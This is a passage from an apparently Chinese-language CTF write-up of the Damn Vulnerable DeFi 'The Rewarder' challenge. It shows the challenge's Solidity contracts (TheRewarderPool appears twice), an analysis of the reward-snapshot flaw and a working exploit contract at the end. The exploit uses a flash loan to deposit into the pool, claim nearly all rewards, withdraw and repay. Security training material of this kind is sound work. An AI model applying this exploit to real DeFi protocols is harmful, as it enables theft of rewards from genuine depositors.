ERC20Snapshot, OwnableRoles &#123;</span><br><span class="line">    uint256 public constant MINTER_ROLE = _ROLE_0;</span><br><span class="line">    uint256 public constant SNAPSHOT_ROLE = _ROLE_1;</span><br><span class="line">    uint256 public constant BURNER_ROLE = _ROLE_2;</span><br><span class="line"></span><br><span class="line">    error NotImplemented();</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;rToken&quot;, &quot;rTKN&quot;) &#123;</span><br><span class="line">        _initializeOwner(msg.sender);</span><br><span class="line">        _grantRoles(msg.sender, MINTER_ROLE | SNAPSHOT_ROLE | BURNER_ROLE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address from, uint256 amount) external onlyRoles(BURNER_ROLE) &#123;</span><br><span class="line">        _burn(from, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function snapshot() external onlyRoles(SNAPSHOT_ROLE) returns (uint256) &#123;</span><br><span class="line">        return _snapshot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address, address, uint256) internal pure override &#123;</span><br><span class="line">        revert NotImplemented();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address, address, uint256) internal pure override &#123;</span><br><span class="line">        revert NotImplemented();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="FlashLoanerPool-sol"><a href="#FlashLoanerPool-sol" class="headerlink" title="FlashLoanerPool.sol"></a>FlashLoanerPool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title FlashLoanerPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> * @dev A simple pool to get flashloans of DVT</span><br><span class="line"> */</span><br><span class="line">contract FlashLoanerPool is ReentrancyGuard &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    error NotEnoughTokenBalance();</span><br><span class="line">    error CallerIsNotContract();</span><br><span class="line">    error FlashLoanNotPaidBack();</span><br><span class="line"></span><br><span class="line">    constructor(address liquidityTokenAddress) &#123;</span><br><span class="line">        liquidityToken = DamnValuableToken(liquidityTokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore = liquidityToken.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        if (amount &gt; balanceBefore) &#123;</span><br><span class="line">            revert NotEnoughTokenBalance();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (!msg.sender.isContract()) &#123;</span><br><span class="line">            revert CallerIsNotContract();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        liquidityToken.transfer(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        msg.sender.functionCall(abi.encodeWithSignature(&quot;receiveFlashLoan(uint256)&quot;, amount));</span><br><span class="line"></span><br><span class="line">        if (liquidityToken.balanceOf(address(this)) &lt; balanceBefore) &#123;</span><br><span class="line">            revert FlashLoanNotPaidBack();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="RewardToken-sol"><a href="#RewardToken-sol" class="headerlink" title="RewardToken.sol"></a>RewardToken.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;solady/src/auth/OwnableRoles.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title RewardToken</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract RewardToken is ERC20, OwnableRoles &#123;</span><br><span class="line">    uint256 public constant MINTER_ROLE = _ROLE_0;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;Reward Token&quot;, &quot;RWT&quot;) &#123;</span><br><span class="line">        _initializeOwner(msg.sender);</span><br><span class="line">        _grantRoles(msg.sender, MINTER_ROLE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) &#123;</span><br><span class="line">        _mint(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>TheRewarderPool.sol</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/utils/FixedPointMathLib.sol&quot;;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &#123; RewardToken &#125; from &quot;./RewardToken.sol&quot;;</span><br><span class="line">import &#123; AccountingToken &#125; from &quot;./AccountingToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TheRewarderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TheRewarderPool &#123;</span><br><span class="line">    using FixedPointMathLib for uint256;</span><br><span class="line"></span><br><span class="line">    // Minimum duration of each round of rewards in seconds</span><br><span class="line">    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;</span><br><span class="line">    </span><br><span class="line">    uint256 public constant REWARDS = 100 ether;</span><br><span class="line"></span><br><span class="line">    // Token deposited into the pool by users</span><br><span class="line">    address public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    // Token used for internal accounting and snapshots</span><br><span class="line">    // Pegged 1:1 with the liquidity token</span><br><span class="line">    AccountingToken public immutable accountingToken;</span><br><span class="line"></span><br><span class="line">    // Token in which rewards are issued</span><br><span class="line">    RewardToken public immutable rewardToken;</span><br><span class="line"></span><br><span class="line">    uint128 public lastSnapshotIdForRewards;</span><br><span class="line">    uint64 public lastRecordedSnapshotTimestamp;</span><br><span class="line">    uint64 public roundNumber; // Track number of rounds</span><br><span class="line">    mapping(address =&gt; uint64) public lastRewardTimestamps;</span><br><span class="line"></span><br><span class="line">    error InvalidDepositAmount();</span><br><span class="line"></span><br><span class="line">    constructor(address _token) &#123;</span><br><span class="line">        // Assuming all tokens have 18 decimals</span><br><span class="line">        liquidityToken = _token;</span><br><span class="line">        accountingToken = new AccountingToken();</span><br><span class="line">        rewardToken = new RewardToken();</span><br><span class="line"></span><br><span class="line">        _recordSnapshot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Deposit `amount` liquidity tokens into the pool, minting accounting tokens in exchange.</span><br><span class="line">     *         Also distributes rewards if available.</span><br><span class="line">     * @param amount amount of tokens to be deposited</span><br><span class="line">     */</span><br><span class="line">    function deposit(uint256 amount) external &#123;</span><br><span class="line">        if (amount == 0) &#123;</span><br><span class="line">            revert InvalidDepositAmount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        accountingToken.mint(msg.sender, amount);</span><br><span class="line">        distributeRewards();</span><br><span class="line"></span><br><span class="line">        SafeTransferLib.safeTransferFrom(</span><br><span class="line">            liquidityToken,</span><br><span class="line">            msg.sender,</span><br><span class="line">            address(this),</span><br><span class="line">            amount</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        accountingToken.burn(msg.sender, amount);</span><br><span class="line">        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function distributeRewards() public returns (uint256 rewards) &#123;</span><br><span class="line">        if (isNewRewardsRound()) &#123;</span><br><span class="line">            _recordSnapshot();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);</span><br><span class="line">        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);</span><br><span class="line"></span><br><span class="line">        if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123;</span><br><span class="line">            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);</span><br><span class="line">            if (rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;</span><br><span class="line">                rewardToken.mint(msg.sender, rewards);</span><br><span class="line">                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _recordSnapshot() private &#123;</span><br><span class="line">        lastSnapshotIdForRewards = uint128(accountingToken.snapshot());</span><br><span class="line">        lastRecordedSnapshotTimestamp = uint64(block.timestamp);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++roundNumber;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _hasRetrievedReward(address account) private view returns (bool) &#123;</span><br><span class="line">        return (</span><br><span class="line">            lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp</span><br><span class="line">                &amp;&amp; lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isNewRewardsRound() public view returns (bool) &#123;</span><br><span class="line">        return block.timestamp &gt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="TheRewarderPool-sol"><a href="#TheRewarderPool-sol" class="headerlink" title="TheRewarderPool.sol"></a>TheRewarderPool.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/utils/FixedPointMathLib.sol&quot;;</span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line">import &#123; RewardToken &#125; from &quot;./RewardToken.sol&quot;;</span><br><span class="line">import &#123; AccountingToken &#125; from &quot;./AccountingToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TheRewarderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TheRewarderPool &#123;</span><br><span class="line">    using FixedPointMathLib for uint256;</span><br><span class="line"></span><br><span class="line">    // Minimum duration of each round of rewards in seconds</span><br><span class="line">    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;</span><br><span class="line">    </span><br><span class="line">    uint256 public constant REWARDS = 100 ether;</span><br><span class="line"></span><br><span class="line">    // Token deposited into the pool by users</span><br><span class="line">    address public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    // Token used for internal accounting and snapshots</span><br><span class="line">    // Pegged 1:1 with the liquidity token</span><br><span class="line">    AccountingToken public immutable accountingToken;</span><br><span class="line"></span><br><span class="line">    // Token in which rewards are issued</span><br><span class="line">    RewardToken public immutable rewardToken;</span><br><span class="line"></span><br><span class="line">    uint128 public lastSnapshotIdForRewards;</span><br><span class="line">    uint64 public lastRecordedSnapshotTimestamp;</span><br><span class="line">    uint64 public roundNumber; // Track number of rounds</span><br><span class="line">    mapping(address =&gt; uint64) public lastRewardTimestamps;</span><br><span class="line"></span><br><span class="line">    error InvalidDepositAmount();</span><br><span class="line"></span><br><span class="line">    constructor(address _token) &#123;</span><br><span class="line">        // Assuming all tokens have 18 decimals</span><br><span class="line">        liquidityToken = _token;//DamnValuableToken</span><br><span class="line">        accountingToken = new AccountingToken();</span><br><span class="line">        rewardToken = new RewardToken();</span><br><span class="line"></span><br><span class="line">        _recordSnapshot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice Deposit `amount` liquidity tokens into the pool, minting accounting tokens in exchange.</span><br><span class="line">     *         Also distributes rewards if available.</span><br><span class="line">     * @param amount amount of tokens to be deposited</span><br><span class="line">     */</span><br><span class="line">    function deposit(uint256 amount) external &#123;</span><br><span class="line">        if (amount == 0) &#123;</span><br><span class="line">            revert InvalidDepositAmount();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        accountingToken.mint(msg.sender, amount);</span><br><span class="line">        distributeRewards();</span><br><span class="line"></span><br><span class="line">        SafeTransferLib.safeTransferFrom(</span><br><span class="line">            liquidityToken,</span><br><span class="line">            msg.sender,</span><br><span class="line">            address(this),</span><br><span class="line">            amount</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount) external &#123;</span><br><span class="line">        accountingToken.burn(msg.sender, amount);</span><br><span class="line">        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function distributeRewards() public returns (uint256 rewards) &#123;</span><br><span class="line">        if (isNewRewardsRound()) &#123;</span><br><span class="line">            _recordSnapshot();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);</span><br><span class="line">        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);</span><br><span class="line"></span><br><span class="line">        if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123;</span><br><span class="line">            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);</span><br><span class="line">            if (rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;</span><br><span class="line">                rewardToken.mint(msg.sender, rewards);</span><br><span class="line">                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _recordSnapshot() private &#123;</span><br><span class="line">        lastSnapshotIdForRewards = uint128(accountingToken.snapshot());</span><br><span class="line">        lastRecordedSnapshotTimestamp = uint64(block.timestamp);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++roundNumber;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _hasRetrievedReward(address account) private view returns (bool) &#123;</span><br><span class="line">        return (</span><br><span class="line">            lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp</span><br><span class="line">                &amp;&amp; lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isNewRewardsRound() public view returns (bool) &#123;</span><br><span class="line">        return block.timestamp &gt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h4><p>这道题比较复杂，看了很久终于明白过来，先看<code>js</code>文件，这道题是让我们使得之前存在的用户在下次获得奖励时，要少于<code>10**16</code>个代币，同时奖励代币要多出来，我们要获得大于0的奖励并且要接近<code>100 ether</code></p>
<p>我们可以先看看<code>TheRewardPool</code>合约，在这个合约当中我们可以看到一个与奖励机制有关的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function distributeRewards() public returns (uint256 rewards) &#123;</span><br><span class="line">        if (isNewRewardsRound()) &#123;</span><br><span class="line">            _recordSnapshot();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);</span><br><span class="line">        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);</span><br><span class="line"></span><br><span class="line">        if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123;</span><br><span class="line">            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);</span><br><span class="line">            if (rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;</span><br><span class="line">                rewardToken.mint(msg.sender, rewards);</span><br><span class="line">                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>在这个函数中我们可以看到调用者应获得的奖励的数额为<code>amountDeposited.mulDiv(REWARDS, totalDeposits);</code>，其中<code>amountDeposited</code>是调用者所拥有的<code>accountToken</code>的数量，而<code>totalDeposits</code>则是指<code>amountToken</code>的代币总额。</p>
<p>接下来我们看看需要满足的条件：</p>
<p>1.让我们使得之前存在的用户在下次获得奖励时，要少于<code>10**16</code>个代币：</p>
<p>想满足这个条件我们可以写出一个式子<br>$$<br>\frac{100<em>10^{18}<em>100</em>10^{18}}{400</em>10^{18}+?*10^{18}}&gt; 10^{16}<br>$$</p>
<p>就可以计算得出$?&gt; 999600$</p>
<p>2.我们要获得的奖励要接近<code>100 ether</code>，差距小于<code>10**17</code>个</p>
<p>我们可以写出式子<br>$$<br>\frac{100<em>10^{18}</em>?<em>10^{18}}{400</em>10^{18}+?<em>10^{18}}&gt; 100</em>10^{18}-10^{17}<br>$$<br>我们可以得到$?&gt;399600$</p>
<p>跟据以上两个条件我们可以得出我们需要在<code>TheRewarderPool</code>中存入大于$999600*10^{18}$个<code>liquidityToken</code>，而如何获取这笔钱呢，我们可以看到<code>FlashLoanPool</code>合约中的闪电贷可以实现这个功能，同时还不需要手续费，并且当我们从<code>TheRewarderPool</code>中取出存款时也不会删除我们的奖励币，最重要的是<code>AccountingToken</code>合约引用的<code>ERC20Snapshot</code>合约中只重写了<code>_beforeTokenTransfer()</code>函数，而在<code>ERC20</code>的<code>_burn()</code>函数中是先执行的<code>_beforeTokenTransfer()</code>，再去减的<code>_totalSupply</code>，所以在第三轮的五天内，<code>totalDeposits</code>的数值都不会变</p>
<h4 id="Attack-4"><a href="#Attack-4" class="headerlink" title="Attack"></a>Attack</h4><h5 id="TheRewarderPoolAttack-sol"><a href="#TheRewarderPoolAttack-sol" class="headerlink" title="TheRewarderPoolAttack.sol"></a>TheRewarderPoolAttack.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line">import &quot;./FlashLoanerPool.sol&quot;;</span><br><span class="line">import &quot;./TheRewarderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TheRewarderPoolAttack&#123;</span><br><span class="line">    FlashLoanerPool pool;</span><br><span class="line">    TheRewarderPool pool2;</span><br><span class="line">    RewardToken tokens;</span><br><span class="line">    DamnValuableToken public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr,address _addr2,address _addr3,address liquidityTokenAddress)&#123;</span><br><span class="line">        pool = FlashLoanerPool(_addr);</span><br><span class="line">        pool2 = TheRewarderPool(_addr2);</span><br><span class="line">        tokens = RewardToken(_addr3);</span><br><span class="line">        liquidityToken = DamnValuableToken(liquidityTokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Loan(uint256 amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveFlashLoan(uint256 amount) public&#123;</span><br><span class="line">        liquidityToken.approve(address(pool2), amount);</span><br><span class="line">        pool2.deposit(amount);</span><br><span class="line">        pool2.withdraw(amount);</span><br><span class="line">        liquidityToken.transfer(address(pool), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(address player) public &#123;</span><br><span class="line">        tokens.transfer(player,tokens.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

